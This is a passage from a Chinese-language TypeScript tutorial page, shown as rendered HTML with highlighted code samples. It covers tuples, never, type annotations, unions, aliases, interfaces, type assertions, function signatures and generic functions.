<li>Tuple：固定长度的数组，且每个位置的类型也是确定的<ul>
<li>[string, number] 二元组</li>
<li>[string, number, string] 三元组</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>操作符<ul>
<li>in 判断对象是否有属性，例如<code>if (&quot;swim&quot; in animal) return animal.swim();</code></li>
<li>instanceof 检查值是否为类型的实例，例如<code>if (x instanceof Date) x.toUTCString();</code></li>
</ul>
</li>
</ul>
<div class="tabs" id="tstypemodel"><ul class="nav-tabs"><li class="tab active"><a href="#tstypemodel-1">never</a></li><li class="tab"><a href="#tstypemodel-2">Tuple</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tstypemodel-1"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Circle</span> &#123;</span><br><span class="line">  <span class="attr">kind</span>: <span class="string">&quot;circle&quot;</span>;</span><br><span class="line">  <span class="attr">radius</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Square</span> &#123;</span><br><span class="line">  <span class="attr">kind</span>: <span class="string">&quot;square&quot;</span>;</span><br><span class="line">  <span class="attr">sideLength</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Shape</span> = <span class="title class_">Circle</span> | <span class="title class_">Square</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getArea</span>(<span class="params">shape: Shape</span>) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (shape.<span class="property">kind</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;circle&quot;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="property">PI</span> * shape.<span class="property">radius</span> ** <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;square&quot;</span>:</span><br><span class="line">      <span class="keyword">return</span> shape.<span class="property">sideLength</span> ** <span class="number">2</span>;</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="keyword">const</span> <span class="attr">_exhaustiveCheck</span>: <span class="built_in">never</span> = shape;</span><br><span class="line">      <span class="keyword">return</span> _exhaustiveCheck;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tstypemodel-2"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Either2</span>dOr3d = [<span class="built_in">number</span>, <span class="built_in">number</span>, <span class="built_in">number</span>?];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setCoord</span>(<span class="params">coord: Either2dOr3d</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [x, y, z] = coord;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;coord.length&#125;</span> dimensions`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setCoord</span>([<span class="number">1</span>, <span class="number">2</span>])    <span class="comment">// 2 dimensions</span></span><br><span class="line"><span class="title function_">setCoord</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) <span class="comment">// 3 dimensions</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="类型注解"><a href="#类型注解" class="headerlink" title="类型注解"></a>类型注解</h2><ul>
<li>类型注解（type Annotation）用于声明变量、函数参数、函数返回值的类型，会被编译器删除<ul>
<li>支持自定义Object类型作为注解，例如<code>pt: &#123; x: number; y: number &#125;</code></li>
<li>支持字面量作为注解，例如<code>alignment: &quot;left&quot; | &quot;right&quot; | &quot;center&quot;</code></li>
<li>支持函数类型表达式（类似箭头函数）作为注解，例如<code>fn: (a: string) =&gt; void</code></li>
<li><code>?:</code> 用在函数参数上，说明参数是可选的，例如<code>id?: number</code></li>
<li><code>keyof</code> 可以将某个对象的key收集起来作为类型</li>
<li><code>in keyof</code> 可将某个对象的所有属性收集起来</li>
</ul>
</li>
</ul>
<div class="tabs" id="tsannotation"><ul class="nav-tabs"><li class="tab active"><a href="#tsannotation-1">General</a></li><li class="tab"><a href="#tsannotation-2">ByObjectType</a></li><li class="tab"><a href="#tsannotation-3">OptionalProperties</a></li><li class="tab"><a href="#tsannotation-4">LiteralType</a></li><li class="tab"><a href="#tsannotation-5">FunctionType</a></li><li class="tab"><a href="#tsannotation-6">keyof</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tsannotation-1"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Type Annotations on Variables</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">myName</span>: <span class="built_in">string</span> = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parameter type annotation</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, &quot;</span> + name.<span class="title function_">toUpperCase</span>() + <span class="string">&quot;!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return Type Annotations</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getFavoriteNumber</span>(<span class="params"></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">26</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsannotation-2"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The parameter&#x27;s type annotation is an object type</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printCoord</span>(<span class="params">pt: &#123; x: <span class="built_in">number</span>; y: <span class="built_in">number</span> &#125;</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The coordinate&#x27;s x value is &quot;</span> + pt.<span class="property">x</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The coordinate&#x27;s y value is &quot;</span> + pt.<span class="property">y</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">printCoord</span>(&#123; <span class="attr">x</span>: <span class="number">3</span>, <span class="attr">y</span>: <span class="number">7</span> &#125;);</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsannotation-3"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printName</span>(<span class="params">obj: &#123; first: <span class="built_in">string</span>; last?: <span class="built_in">string</span> &#125;</span>) &#123;&#125;</span><br><span class="line"><span class="title function_">printName</span>(&#123; <span class="attr">first</span>: <span class="string">&quot;Bob&quot;</span> &#125;);</span><br><span class="line"><span class="title function_">printName</span>(&#123; <span class="attr">first</span>: <span class="string">&quot;Alice&quot;</span>, <span class="attr">last</span>: <span class="string">&quot;Alisson&quot;</span> &#125;);</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsannotation-4"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printText</span>(<span class="params">s: <span class="built_in">string</span>, alignment: <span class="string">&quot;left&quot;</span> | <span class="string">&quot;right&quot;</span> | <span class="string">&quot;center&quot;</span></span>) &#123;&#125;</span><br><span class="line"><span class="title function_">printText</span>(<span class="string">&quot;Hello, world&quot;</span>, <span class="string">&quot;left&quot;</span>);</span><br><span class="line"><span class="title function_">printText</span>(<span class="string">&quot;G&#x27;day, mate&quot;</span>, <span class="string">&quot;centre&quot;</span>); <span class="comment">// Error</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsannotation-5"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">greeter</span>(<span class="params">fn: (a: <span class="built_in">string</span>) =&gt; <span class="built_in">void</span></span>) &#123;</span><br><span class="line">  <span class="title function_">fn</span>(<span class="string">&quot;Hello, World&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printToConsole</span>(<span class="params">s: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">greeter</span>(printToConsole);</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsannotation-6"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Point</span> = &#123; <span class="attr">x</span>: <span class="built_in">number</span>; <span class="attr">y</span>: <span class="built_in">string</span> &#125;;</span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">PK</span> = keyof <span class="title class_">Point</span>; <span class="comment">// &#x27;x&#x27; | &#x27;y&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">p1</span>: <span class="title class_">Point</span> = &#123;<span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="string">&#x27;2&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">p2</span>: <span class="variable constant_">PK</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1, p2); <span class="comment">// &#123; x: 1, y: &#x27;2&#x27; &#125; x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">OptionsFlags</span>&lt;<span class="title class_">Type</span>&gt; = &#123;</span><br><span class="line">  [<span class="title class_">Property</span> <span class="keyword">in</span> keyof <span class="title class_">Type</span>]: <span class="built_in">boolean</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">FeatureFlags</span> = &#123;</span><br><span class="line">  <span class="attr">darkMode</span>: <span class="function">() =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">  <span class="attr">newUserProfile</span>: <span class="function">() =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">FeatureOptions</span> = <span class="title class_">OptionsFlags</span>&lt;<span class="title class_">FeatureFlags</span>&gt;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type FeatureOptions = &#123;</span></span><br><span class="line"><span class="comment">    darkMode: boolean;</span></span><br><span class="line"><span class="comment">    newUserProfile: boolean;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h3><ul>
<li>联合类型（union type）是指多种类型的集合<ul>
<li><code>|</code> 操作符，例如<code>id: number | string</code></li>
</ul>
</li>
</ul>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printId</span>(<span class="params">id: <span class="built_in">number</span> | <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Your ID is: &quot;</span> + id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h3><ul>
<li>类型别名（Type Alias）用于定义类型别名，便于重用<ul>
<li><code>type</code> 关键字，例如<code>type ID = number | string;</code></li>
<li><code>&amp;</code> 操作符进行类型扩展</li>
</ul>
</li>
</ul>
<div class="tabs" id="tstypealias"><ul class="nav-tabs"><li class="tab active"><a href="#tstypealias-1">General</a></li><li class="tab"><a href="#tstypealias-2">Extends</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tstypealias-1"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Point</span> = &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printCoord</span>(<span class="params">pt: Point</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The coordinate&#x27;s x value is &quot;</span> + pt.<span class="property">x</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The coordinate&#x27;s y value is &quot;</span> + pt.<span class="property">y</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tstypealias-2"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> A = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> B = A &amp; &#123;</span><br><span class="line">  <span class="attr">b</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">b</span>: B = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// &#123; a: 1, b: 2 &#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="声明接口"><a href="#声明接口" class="headerlink" title="声明接口"></a>声明接口</h3><ul>
<li>声明接口（interface declaration）是命名对象类型（object type）的一种方法<ul>
<li><code>extends</code>关键字进行接口扩展，返回boolean值</li>
<li><code>readonly</code> 标识属性是只读的，例如<code>interface SomeType &#123; readonly prop: string; &#125;</code><ul>
<li>只表示属性自身immutable，其内部的值仍然是可变的</li>
</ul>
</li>
<li>索引签名（index signature）支持描述对象的结构，例如<code>&#123; [key: string]: number &#125;</code></li>
<li>支持重新声明以新增字段</li>
</ul>
</li>
</ul>
<div class="tabs" id="tsinterface"><ul class="nav-tabs"><li class="tab active"><a href="#tsinterface-1">General</a></li><li class="tab"><a href="#tsinterface-2">Extends</a></li><li class="tab"><a href="#tsinterface-3">IndexSignature</a></li><li class="tab"><a href="#tsinterface-4">AddNewField</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tsinterface-1"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printCoord</span>(<span class="params">pt: Point</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The coordinate&#x27;s x value is &quot;</span> + pt.<span class="property">x</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The coordinate&#x27;s y value is &quot;</span> + pt.<span class="property">y</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">printCoord</span>(&#123; <span class="attr">x</span>: <span class="number">100</span>, <span class="attr">y</span>: <span class="number">100</span> &#125;);</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsinterface-2"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> A &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> B <span class="keyword">extends</span> A &#123;</span><br><span class="line">  <span class="attr">b</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">b</span>: B = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// &#123; a: 1, b: 2 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">live</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">woof</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Example1</span> = <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> ? <span class="built_in">number</span> : <span class="built_in">string</span>;    <span class="comment">// number</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Example2</span> = <span class="title class_">RegExp</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> ? <span class="built_in">number</span> : <span class="built_in">string</span>; <span class="comment">// string</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsinterface-3"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  <span class="attr">a1</span>: <span class="number">100_000</span>,</span><br><span class="line">  <span class="attr">a2</span>: <span class="number">20_000</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> b = &#123;</span><br><span class="line">  <span class="attr">b1</span>: <span class="number">320_000</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">obj: &#123; [key: <span class="built_in">string</span>]: <span class="built_in">number</span> &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> total = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> name <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    total += obj[name];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(a)); <span class="comment">// =&gt; 120_000</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(b)); <span class="comment">// =&gt; 320_000</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsinterface-4"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> TI &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> TI &#123;</span><br><span class="line">  b?: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">t1</span>: <span class="variable constant_">TI</span> = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">t2</span>: <span class="variable constant_">TI</span> = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(t1); <span class="comment">// &#123; a: 1 &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(t2); <span class="comment">// &#123; a: 1, b: 2 &#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h2><ul>
<li>类型断言（type assertion）用于指定更具体的返回值类型，会被编译器删除，因此不影响js运行时状态<ul>
<li><code>as</code>关键字<ul>
<li><code>as const</code>后缀转换整个对象（包括每个属性）作为字面量类型（literal type）</li>
</ul>
</li>
<li><code>&lt;&gt;</code>语法</li>
<li><code>!</code>后缀 表示值非<code>null</code>或<code>undefined</code>时才会执行后续操作</li>
</ul>
</li>
</ul>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Type assertion</span></span><br><span class="line"><span class="keyword">const</span> myCanvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;main_canvas&quot;</span>) <span class="keyword">as</span> <span class="title class_">HTMLCanvasElement</span>;</span><br><span class="line"><span class="keyword">const</span> myCanvas = &lt;<span class="title class_">HTMLCanvasElement</span>&gt;<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;main_canvas&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> a = (expr <span class="keyword">as</span> <span class="built_in">any</span>) <span class="keyword">as</span> T;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use literal Inference</span></span><br><span class="line"><span class="keyword">const</span> req = &#123; <span class="attr">url</span>: <span class="string">&quot;https://example.com&quot;</span>, <span class="attr">method</span>: <span class="string">&quot;GET&quot;</span> &#125; <span class="keyword">as</span> <span class="keyword">const</span>;</span><br><span class="line"><span class="title function_">handleRequest</span>(req.<span class="property">url</span>, req.<span class="property">method</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Type assertion that the value isn’t null or undefined</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">liveDangerously</span>(<span class="params">x?: <span class="built_in">number</span> | <span class="literal">null</span></span>) &#123;</span><br><span class="line">    <span class="comment">// No error</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x!.<span class="title function_">toFixed</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><ul>
<li>函数类型表达式（function type expression）用来描述函数，类似于箭头函数<ul>
<li>无法描述带属性（property）的函数对象</li>
</ul>
</li>
<li>调用签名（call signature）通过类型别名的方式描述带属性的函数</li>
<li>构造签名（construct Signature）用来描述通过<code>new</code>操作符调用的函数</li>
<li>重载签名（overload signature）支持描述以多种方式来调用的函数</li>
</ul>
<div class="tabs" id="tsfunction"><ul class="nav-tabs"><li class="tab active"><a href="#tsfunction-1">FunctionTypeExpression</a></li><li class="tab"><a href="#tsfunction-2">CallSignature</a></li><li class="tab"><a href="#tsfunction-3">ConstructSignature</a></li><li class="tab"><a href="#tsfunction-4">OverloadSignature</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tsfunction-1"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">greeter</span>(<span class="params">fn: (a: <span class="built_in">string</span>) =&gt; <span class="built_in">void</span></span>) &#123;</span><br><span class="line">  <span class="title function_">fn</span>(<span class="string">&quot;Hello, World&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printToConsole</span>(<span class="params">s: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">greeter</span>(printToConsole);</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsfunction-2"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">DescribableFunction</span> = &#123;</span><br><span class="line">  <span class="attr">description</span>: <span class="built_in">string</span>;</span><br><span class="line">  (<span class="attr">someArg</span>: <span class="built_in">number</span>): <span class="built_in">boolean</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params">fn: DescribableFunction</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(fn.<span class="property">description</span> + <span class="string">&quot; returned &quot;</span> + <span class="title function_">fn</span>(<span class="number">6</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsfunction-3"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">SomeConstructor</span> = &#123;</span><br><span class="line">  <span class="keyword">new</span> (<span class="attr">s</span>: <span class="built_in">string</span>): <span class="title class_">SomeObject</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">ctor: SomeConstructor</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">ctor</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsfunction-4"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeDate</span>(<span class="params">timestamp: <span class="built_in">number</span></span>): <span class="title class_">Date</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">makeDate</span>(<span class="params">m: <span class="built_in">number</span>, d: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>): <span class="title class_">Date</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">makeDate</span>(<span class="params">mOrTimestamp: <span class="built_in">number</span>, d?: <span class="built_in">number</span>, y?: <span class="built_in">number</span></span>): <span class="title class_">Date</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (d !== <span class="literal">undefined</span> &amp;&amp; y !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(y, mOrTimestamp, d);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(mOrTimestamp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> d1 = <span class="title function_">makeDate</span>(<span class="number">12345678</span>);</span><br><span class="line"><span class="keyword">const</span> d2 = <span class="title function_">makeDate</span>(<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">const</span> d3 = <span class="title function_">makeDate</span>(<span class="number">1</span>, <span class="number">3</span>); <span class="comment">// error TS2575</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d1); <span class="comment">// 1970-01-01T03:25:45.678Z</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d2); <span class="comment">// 1905-06-04T16:00:00.000Z</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="泛型函数"><a href="#泛型函数" class="headerlink" title="泛型函数"></a>泛型函数</h2><ul>
<li>泛型函数（generic Function）<ul>
<li>支持类型推理（inference）</li>
<li>支持类型约束（constraint）</li>
<li>支持指定类型参数（Specifying Type Arguments）</li>
</ul>
</li>
</ul>
<div class="tabs" id="tsgenericfunction"><ul class="nav-tabs"><li class="tab active"><a href="#tsgenericfunction-1">Basic</a></li><li class="tab"><a href="#tsgenericfunction-2">WithInference</a></li><li class="tab"><a href="#tsgenericfunction-3">Constraint</a></li><li class="tab"><a href="#tsgenericfunction-4">SpecifyingTypeArgument</a></li></ul><div class="tab-content"><div class="tab-pane active" id="tsgenericfunction-1"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> firstElement&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arr</span>: <span class="title class_">Type</span>[]): <span class="title class_">Type</span> | <span class="literal">undefined</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> x = <span class="title function_">firstElement</span>([<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>]);</span><br><span class="line"><span class="keyword">const</span> y = <span class="title function_">firstElement</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">const</span> z = <span class="title function_">firstElement</span>([]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x, y, z); <span class="comment">// a 1 undefined</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsgenericfunction-2"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> map&lt;<span class="title class_">Input</span>, <span class="title class_">Output</span>&gt;(<span class="attr">arr</span>: <span class="title class_">Input</span>[], <span class="attr">func</span>: <span class="function">(<span class="params">arg: Input</span>) =&gt;</span> <span class="title class_">Output</span>): <span class="title class_">Output</span>[] &#123;</span><br><span class="line">  <span class="keyword">return</span> arr.<span class="title function_">map</span>(func);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> parsed = <span class="title function_">map</span>([<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>], <span class="function">(<span class="params">n</span>) =&gt;</span> <span class="built_in">parseInt</span>(n));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(parsed); <span class="comment">// [ 1, 2, 3 ]</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="tsgenericfunction-3"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> longest&lt;<span class="title class_">Type</span> <span class="keyword">extends</span> &#123; <span class="attr">length</span>: <span class="built_in">number</span> &#125;&gt;(<span class="attr">a</span>: <span class="title class_">Type</span>, <span class="attr">b</span>: <span class="title class_">Type</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (a.<span class="property">length</span> &gt;= b.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> 